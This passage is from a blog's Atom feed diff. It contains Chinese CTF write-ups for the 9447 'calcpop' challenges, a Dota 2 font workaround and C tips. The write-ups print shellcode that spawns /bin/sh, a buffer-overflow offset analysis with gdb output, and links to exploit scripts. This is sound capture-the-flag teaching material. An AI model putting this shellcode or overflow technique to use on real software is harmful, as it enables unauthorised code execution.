+&lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;retn&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;溢出到保存 ecx 的位置，使 ecx - 4 指向存有 shellcode 地址的栈位置，然后 ret 就能跳转到 shellcode.&lt;/p&gt;
+
+&lt;h3 id=&quot;shellcode&quot;&gt;Shellcode&lt;/h3&gt;
+&lt;p&gt;这题怎么写 shellcode 也是一个难点，因为系统是 9447 写的，不能直接用 execv 系统调用。所幸的是本题的系统调用功能都是能从一些字符串上看出来的。比如&lt;code class=&quot;highlighter-rouge&quot;&gt;read(%d %x %d)&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;write(%d %x %d)&lt;/code&gt;之类。strings 一下可以看到&lt;code class=&quot;highlighter-rouge&quot;&gt;spawn(%x %x %d)&lt;/code&gt;，我就猜测这个是类似 execv 的系统调用。可是参数不明确，特别是第三个参数。试了几次，发现用&lt;code class=&quot;highlighter-rouge&quot;&gt;spawn(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, 1)&lt;/code&gt;这样的参数是可以成功的，第三个参数 1 具体是什么含义，我也没搞明白。&lt;/p&gt;
+
+&lt;p&gt;用 pwntool 生成的 shellcode 如下:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;c1&quot;&gt;; push '/bin/sh\x00'&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1010101&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x169722e&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6e69622f&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
+
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;; junk&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;302125832&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x12121212&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;; spawn(%x, %x, %d)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;exppy&quot;&gt;exp.py&lt;/h3&gt;
+
+&lt;p&gt;可以用 redos 中的 level1 本地调试。&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/b4aee1ac22f1b3039d30&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/b4aee1ac22f1b3039d30&quot;&gt;cubarco/b4aee1ac22f1b3039d30&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/12/9477-calcpop-reloaded-writeup/&quot;&gt;Writeup-9447 CTF: calcpop-reloaded&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on December 04, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Writeup-9447 CTF: calcpop]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/11/9477-calcpop-writeup/" />
+  <id>https://cubl.in/blog/2015/11/9477-calcpop-writeup</id>
+  <published>2015-11-30T00:00:00+00:00</published>
+  <updated>2015-11-30T00:00:00+00:00</updated>
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;先看反汇编代码：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objdump&quot; data-lang=&quot;objdump&quot;&gt;...
+8048460:	55                   	push   %ebp
+8048461:	89 e5                	mov    %esp,%ebp
+8048463:	57                   	push   %edi
+8048464:	56                   	push   %esi
+8048465:	be 00 01 00 00       	mov    $0x100,%esi
+804846a:	53                   	push   %ebx
+804846b:	83 e4 f0             	and    $0xfffffff0,%esp
+804846e:	81 ec 90 00 00 00    	sub    $0x90,%esp
+8048474:	a1 60 a0 04 08       	mov    0x804a060,%eax
+8048479:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
+8048480:	00
+8048481:	8d 5c 24 10          	lea    0x10(%esp),%ebx
+8048485:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
+804848c:	00
+804848d:	89 df                	mov    %ebx,%edi
+804848f:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
+8048496:	00
+8048497:	89 04 24             	mov    %eax,(%esp)
+804849a:	e8 a1 ff ff ff       	call   8048440 &amp;lt;setvbuf@plt&amp;gt;
+804849f:	c7 04 24 10 88 04 08 	movl   $0x8048810,(%esp)
+80484a6:	e8 55 ff ff ff       	call   8048400 &amp;lt;puts@plt&amp;gt;
+80484ab:	eb 29                	jmp    80484d6 &amp;lt;main+0x76&amp;gt;
+80484ad:	8d 76 00             	lea    0x0(%esi),%esi
+80484b0:	a1 40 a0 04 08       	mov    0x804a040,%eax
+80484b5:	89 04 24             	mov    %eax,(%esp)
+80484b8:	e8 33 ff ff ff       	call   80483f0 &amp;lt;_IO_getc@plt&amp;gt;
+80484bd:	85 c0                	test   %eax,%eax
+80484bf:	0f 88 e3 00 00 00    	js     80485a8 &amp;lt;main+0x148&amp;gt;
+80484c5:	88 07                	mov    %al,(%edi)
+80484c7:	83 ee 01             	sub    $0x1,%esi
+80484ca:	83 c7 01             	add    $0x1,%edi
+80484cd:	83 f8 0a             	cmp    $0xa,%eax
+80484d0:	0f 84 ca 00 00 00    	je     80485a0 &amp;lt;main+0x140&amp;gt;
+80484d6:	83 fe 01             	cmp    $0x1,%esi
+80484d9:	77 d5                	ja     80484b0 &amp;lt;main+0x50&amp;gt;
+80484db:	85 f6                	test   %esi,%esi
+80484dd:	0f 85 bd 00 00 00    	jne    80485a0 &amp;lt;main+0x140&amp;gt;
+...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;这段代码是 main() 函数起始的位置，可以看到这里的工作是将终端输入的数据循环读入栈中。其中 esi 寄存器是循环计数器，初始值是 0x100, 而在栈中划分的空间只有 0x90 字节, 这里存在栈溢出。&lt;/p&gt;
+
+&lt;p&gt;用 &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern.py 256&lt;/code&gt; 生成 pattern, 开 gdb 调试 calcpop.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;gdb calcpop
+&lt;span class=&quot;go&quot;&gt;Reading symbols from calcpop...done.
+(gdb) r
+Starting program: /home/cubelin/is/ctf/9447/pwn/calcpop/calcpop
+Welcome to calc.exe
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Missing a space;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;your input was 0xffffd390
+&lt;span class=&quot;gp&quot;&gt;Missing a space;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;your input was 0xffffd390
+&lt;span class=&quot;go&quot;&gt;exit
+Exiting...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41326641 in ?? ()
+(gdb) quit
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;pattern.py 0x41326641
+&lt;span class=&quot;go&quot;&gt;Pattern 0x41326641 first occurrence at position 156 in pattern.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;main() 函数返回地址在 offset 为 156 的位置。然后借由程序返回的栈地址，可以直接执行栈中的 shellcode.&lt;/p&gt;
+
+&lt;p&gt;exp 如下:&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/ee054809d1643602b844&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/ee054809d1643602b844&quot;&gt;cubarco/ee054809d1643602b844&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/11/9477-calcpop-writeup/&quot;&gt;Writeup-9447 CTF: calcpop&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on November 30, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[一个解决 Linux 版 Dota 2 中 CJK 字符显示成方块的 Workaround]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/05/dota2-blocky-cjk-fonts-workaround/" />
+  <id>https://cubl.in/blog/2015/05/dota2-blocky-cjk-fonts-workaround</id>
+  <updated>2015-05-29T00:00:00-00:00</updated>
+  <published>2015-05-14T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;不知道从什么时候开始，Linux 版本的 Dota 2 中载入界面的 tips sentences 和 player name 中的中文会显示成方框，详见 &lt;a href=&quot;https://github.com/ValveSoftware/Dota-2/issues/1688&quot;&gt;issue-1688&lt;/a&gt;。V社基本没搭理这个 bug，只好自己动手修。&lt;/p&gt;
+
+&lt;p&gt;猜想是游戏内直接使用了某个字体，或者该字体不存在时调用了默认字体，但是他们不支持 CJK 字符，所以显示成方块。因为 SteamFonts 给的全是&lt;code class=&quot;highlighter-rouge&quot;&gt;Arial&lt;/code&gt;字体，我猜 Dota 2 那些文本使用的字体可能是&lt;code class=&quot;highlighter-rouge&quot;&gt;Arial&lt;/code&gt;，开&lt;code class=&quot;highlighter-rouge&quot;&gt;FC_DEBUG&lt;/code&gt;跑了一遍发现猜的没错。那么我们要做的就是用&lt;code class=&quot;highlighter-rouge&quot;&gt;fontconfig&lt;/code&gt;把&lt;code class=&quot;highlighter-rouge&quot;&gt;Arial&lt;/code&gt;替换成支持中文的字体。&lt;/p&gt;
+
+&lt;h2 id=&quot;解决办法&quot;&gt;解决办法&lt;/h2&gt;
+&lt;p&gt;替换&lt;code class=&quot;highlighter-rouge&quot;&gt;Arial&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;fontconfig&lt;/code&gt;配置是:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;match&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;target=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pattern&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;test&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;qual=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;any&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;family&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;Arial&lt;span class=&quot;nt&quot;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/test&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;edit&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;family&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;assign&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;binding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;same&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;Noto Sans S Chinese&lt;span class=&quot;nt&quot;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;我用的是&lt;code class=&quot;highlighter-rouge&quot;&gt;Noto Sans S Chinese&lt;/code&gt;，如果用文泉驿正黑就改成&lt;code class=&quot;highlighter-rouge&quot;&gt;WenQuanYi Zen Hei&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;怎么使这个配置生效？有两个方法。&lt;/p&gt;
+
+&lt;h6 id=&quot;环境变量-fontconfig_file&quot;&gt;环境变量 FONTCONFIG_FILE&lt;/h6&gt;
+&lt;p&gt;这个方法需要一个为 Dota 2 单独准备的&lt;code class=&quot;highlighter-rouge&quot;&gt;fontconfig_file&lt;/code&gt;，姑且命名为&lt;code class=&quot;highlighter-rouge&quot;&gt;dota2-fontconfig.conf&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;文件内容如下:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE fontconfig SYSTEM &quot;fonts.dtd&quot;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;fontconfig&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;include&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ignore_missing=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;fonts.conf&lt;span class=&quot;nt&quot;&gt;&amp;lt;/include&amp;gt;&lt;/span&gt;
+
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;match&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;target=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pattern&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;test&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;qual=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;any&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;family&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;Arial&lt;span class=&quot;nt&quot;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/test&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;edit&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;family&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;assign&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;binding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;same&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;Noto Sans S Chinese&lt;span class=&quot;nt&quot;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/fontconfig&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;然后用&lt;code class=&quot;highlighter-rouge&quot;&gt;FONTCONFIG_FILE&lt;/code&gt;环境变量来传递。但是使用这个环境变量之后，&lt;code class=&quot;highlighter-rouge&quot;&gt;fontconfig&lt;/code&gt;不会再加载&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/fonts/fonts.conf&lt;/code&gt;，所以这里把这个文件也包含进来。&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;p&gt;然后这样打开 Steam:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;FONTCONFIG_FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/path/to/dota2-fontconfig.conf
+steam&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;再运行 Dota 2 就不会有方块的困扰了。&lt;/p&gt;
+
+&lt;h6 id=&quot;写进fontsconf&quot;&gt;写进&lt;code class=&quot;highlighter-rouge&quot;&gt;fonts.conf&lt;/code&gt;&lt;/h6&gt;
+&lt;p&gt;另一个方法是直接把字体替换的配置写进&lt;code class=&quot;highlighter-rouge&quot;&gt;fonts.conf&lt;/code&gt;，比如&lt;code class=&quot;highlighter-rouge&quot;&gt;~/.fonts.conf&lt;/code&gt;或者&lt;code class=&quot;highlighter-rouge&quot;&gt;$XDG_CONFIG_HOME/fontconfig/fonts.conf&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;当然这个方法并不推荐，因为会影响到其他程序。&lt;/p&gt;
+
+&lt;h4 id=&quot;update-2015-05-29&quot;&gt;Update 2015-05-29&lt;/h4&gt;
+&lt;p&gt;可能每次都要用命令行启动 Steam 不太方便，下方&lt;a href=&quot;https://cubl.in/blog/2015/05/dota2-blocky-cjk-fonts-workaround/#comment-2051101448&quot;&gt;评论&lt;/a&gt;里有解决办法。就是给 Dota 2 加个启动选项。&lt;/p&gt;
+
+&lt;h4 id=&quot;reference&quot;&gt;Reference&lt;/h4&gt;
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;http://www.freedesktop.org/software/fontconfig/fontconfig-user.html&quot;&gt;fonts-conf&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/05/dota2-blocky-cjk-fonts-workaround/&quot;&gt;一个解决 Linux 版 Dota 2 中 CJK 字符显示成方块的 Workaround&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on May 14, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[C Programming Tricks]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/05/c-programming-tricks/" />
+  <id>https://cubl.in/blog/2015/05/c-programming-tricks</id>
+  <updated>2015-05-05T00:00:00-00:00</updated>
+  <published>2015-05-02T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;这个 Note 用来记录各处收集的 C 编程 tricks. 看到有意思的就会摘一下，来源各异。&lt;/p&gt;
+
+&lt;h2 id=&quot;anonymous-arrays&quot;&gt;Anonymous arrays&lt;/h2&gt;
+&lt;p&gt;C99 offers some really cool stuff using anonymous arrays:&lt;/p&gt;
+
+&lt;h6 id=&quot;removing-pointless-variables&quot;&gt;Removing pointless variables&lt;/h6&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yourSocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOL_SOCKET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SO_REUSEADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* becomes: */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yourSocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOL_SOCKET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SO_REUSEADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h6 id=&quot;passing-a-variable-amount-of-arguments&quot;&gt;Passing a Variable Amount of Arguments&lt;/h6&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;cm&quot;&gt;/* do whatever with x */&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h6 id=&quot;static-linked-lists&quot;&gt;Static linked lists&lt;/h6&gt;
